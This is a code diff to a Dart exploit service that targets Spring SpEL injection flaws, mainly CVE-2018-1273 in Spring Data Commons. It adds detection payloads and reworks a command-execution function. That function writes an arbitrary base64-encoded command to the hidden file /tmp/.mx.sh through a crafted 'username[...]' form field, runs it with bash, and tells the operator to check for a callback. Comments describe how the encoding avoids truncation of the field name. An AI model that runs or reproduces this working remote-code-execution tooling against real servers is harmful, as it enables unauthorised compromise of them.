@@ -59,6 +59,28 @@ class SpringExpService {
     return bytes.join(',');
   }
 
+  Future<http.Response> _postSpringDataCommonsForm(String body) {
+    return http.post(
+      Uri.parse('${baseUri}users?page=&size=5'),
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Origin': '${baseUri.scheme}://${baseUri.host}${baseUri.hasPort ? ':${baseUri.port}' : ''}',
+        'Referer': '${baseUri}users?page=0&size=5',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+      },
+      body: body,
+    ).timeout(timeout);
+  }
+
+  String _buildSpringDataCommonsFormByExpr(String expr) {
+    final key = 'username[$expr]';
+    return '${Uri.encodeQueryComponent(key)}=&password=&repeatedPassword=';
+  }
+
+  String _buildSpringDataCommonsRawFormByExpr(String expr) {
+    return 'username[$expr]=&password=&repeatedPassword=';
+  }
+
   // CVE-2022-22963: Spring Cloud Function routing-expression SpEL
   Future<SpringResult> checkSpringCloudFunction() async {
     try {
@@ -127,12 +149,9 @@ class SpringExpService {
   // CVE-2018-1273: Spring Data Commons SpEL via username field
   Future<SpringResult> checkSpringDataCommons() async {
     try {
-      const payload = 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("id")]=&password=&repeatedPassword=';
-      final res = await http.post(
-        Uri.parse('${baseUri}users?page=&size=5'),
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: payload,
-      ).timeout(timeout);
+      const expr = '#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")';
+      final payload = _buildSpringDataCommonsFormByExpr(expr);
+      final res = await _postSpringDataCommonsForm(payload);
 
       final lower = res.body.toLowerCase();
       final indicators = <String>[
@@ -143,16 +162,44 @@ class SpringExpService {
         'org.springframework.data.mapping',
         'mappingexception',
       ];
+      final hasProxyBindingError =
+          lower.contains('invalid property \'username\'') &&
+          lower.contains('example.users.web.\$proxy');
+      final hasWhitelabel500 =
+          res.statusCode >= 500 &&
+          lower.contains('whitelabel error page') &&
+          lower.contains('this application has no explicit mapping for /error');
       final hasSpelFeature = indicators.any(lower.contains);
-      if (hasSpelFeature) {
+      if (hasSpelFeature || hasProxyBindingError || hasWhitelabel500) {
         return SpringResult(
           true,
           'CVE-2018-1273',
-          'Spring Data Commons 请求返回 SpEL/数据绑定异常特征（状态 ${res.statusCode}）',
+          hasProxyBindingError
+              ? '命中 vulhub README 典型回包（Invalid property username + \$Proxy，HTTP ${res.statusCode}），该漏洞通常为盲打执行'
+              : hasWhitelabel500
+                  ? '命中 vulhub 常见错误页特征（HTTP ${res.statusCode} + Whitelabel Error Page），疑似已触发绑定/表达式链路'
+              : 'Spring Data Commons 请求返回 SpEL/数据绑定异常特征（状态 ${res.statusCode}）',
         );
       }
+      final location = res.headers['location'] ?? '';
+      final redirectedToLogin = location.toLowerCase().contains('login');
+      final contentType = res.headers['content-type'] ?? '';
+      final preview = res.body
+          .replaceAll(RegExp(r'\s+'), ' ')
+          .trim();
+      final shortPreview = preview.length > 180
+          ? '${preview.substring(0, 180)}...'
+          : preview;
+      final hint = redirectedToLogin
+          ? '响应疑似被认证/登录页拦截（Location: $location）'
+          : '未命中 SpEL 特征，可能不是 Spring Data Commons users 端点或版本不受影响';
+      return SpringResult(
+        false,
+        'CVE-2018-1273',
+        '$hint（HTTP ${res.statusCode}, Content-Type: $contentType, 片段: $shortPreview）',
+      );
     } catch (_) {}
-    return SpringResult(false, 'CVE-2018-1273', '');
+    return SpringResult(false, 'CVE-2018-1273', '请求异常或超时，未拿到可用于判定的响应');
   }
 
   // CVE-2017-8046: Spring Data REST PATCH SpEL
@@ -389,15 +436,26 @@ class SpringExpService {
   }
 
   // 执行命令 - CVE-2018-1273
+  // 两步：写文件 + exec。
+  // URL-safe Base64 去掉 padding，规避 + / = 在 application/x-www-form-urlencoded 表单 key 中被截断。
+  // 表达式不含 []，规避 username[<expr>] 字段名被内层 ] 截断。
   Future<String?> execSpringDataCommons(String cmd) async {
     try {
-      final spel = 'username[T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"$cmd\"}).getInputStream(),T(java.nio.charset.Charset).forName(\"UTF-8\"))]=&password=&repeatedPassword=';
-      final res = await http.post(
-        Uri.parse('${baseUri}users?page=&size=5'),
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: spel,
-      ).timeout(timeout);
-      return res.body.isNotEmpty ? res.body : null;
+      final b64 = base64Url.encode(utf8.encode(cmd)).replaceAll('=', '');
+      final writeExpr =
+          '#this.getClass().forName("java.nio.file.Files").write('
+          '#this.getClass().forName("java.nio.file.Paths").get("/tmp/.mx.sh"),'
+          '#this.getClass().forName("java.util.Base64").getUrlDecoder().decode("$b64")'
+          ')';
+      final execExpr =
+          '#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/bin/bash /tmp/.mx.sh")';
+      final writeRes = await _postSpringDataCommonsForm(
+        _buildSpringDataCommonsRawFormByExpr(writeExpr),
+      );
+      final execRes = await _postSpringDataCommonsForm(
+        _buildSpringDataCommonsRawFormByExpr(execExpr),
+      );
+      return '2018-1273 payload 已发送（write=${writeRes.statusCode}, exec=${execRes.statusCode}）。请验证回连。';
     } catch (_) {
       return null;
     }
